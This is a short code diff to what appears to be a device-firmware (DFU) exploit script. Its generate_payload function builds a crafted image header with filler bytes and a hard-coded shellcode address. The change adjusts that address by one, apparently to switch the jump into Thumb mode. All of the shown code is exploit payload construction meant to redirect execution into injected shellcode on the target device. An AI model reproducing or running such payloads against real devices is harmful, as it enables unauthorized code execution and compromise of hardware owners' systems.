@@ -2,7 +2,7 @@ import struct, sys, time
 import dfu
 
 def generate_payload():
-    shellcode_address = 0x8402F1D8
+    shellcode_address = 0x8402F1D8 + 1
     data = struct.pack('<4s2I92sI', 'DATA'[::-1], 12 + 96, 96, '\xF0' * 92, shellcode_address)
     shsh = struct.pack('<4s2I',     'SHSH'[::-1], 12, 0)
     cert = struct.pack('<4s2I',     'CERT'[::-1], 12, 0)
